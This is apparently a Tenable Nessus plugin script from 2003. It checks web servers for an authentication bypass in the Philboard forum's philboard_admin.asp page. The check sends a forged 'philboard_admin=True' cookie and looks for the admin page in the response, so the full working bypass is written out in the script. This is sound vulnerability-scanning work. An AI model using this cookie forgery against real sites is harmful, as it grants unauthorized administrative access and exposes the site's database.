# 
# (C) Tenable Network Security
#
# SEE:http://www.securityfocus.com/archive/1/323224
#

if(description)
{
 script_id(11675);
 script_bugtraq_id(7739);
 script_version ("$Revision: 1.8 $");
 
 name["english"] = "Philboard philboard_admin.ASP Authentication Bypass";
 script_name(english:name["english"]);
 
 desc["english"] = "
The remote host is running Philboard. There is a flaw when handling 
cookie-based authentication credentials which may allow an attacker
to gain unauthorized administrative access or to download the 
database of the remote server.

Solution : Upgrade to the latest version of this Software 
Risk factor : High";
 script_description(english:desc["english"]);
 
 summary["english"] = "Try to bypass Philboard philboard_admin.ASP Authentication";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 2003 Tenable Network Security",
francais:"Ce script est Copyright (C) 2003 Tenable Network Security");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "http_version.nasl", "no404.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

# The script code starts here
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);

if(!get_port_state(port))exit(0);




dirs = make_list( "/philboard", "/board", "/forum", cgi_dirs());

foreach dir (dirs)
{
  req = http_get(item:dir +"/philboard_admin.asp", port:port);
  res = http_keepalive_send_recv(port:port, data:req);
  if( res == NULL ) exit(0);
 
  if( "password" >< res )
  {
   idx = stridx(req, string("\r\n\r\n"));
   req = insstr(req, '\r\nCookie: philboard_admin=True;', idx, idx);
   res = http_keepalive_send_recv(port:port, data:req);
   if('<option value="admin" selected>admin</option>' >< res)
   {
    security_hole(port);
   }
   exit(0);
  }
}
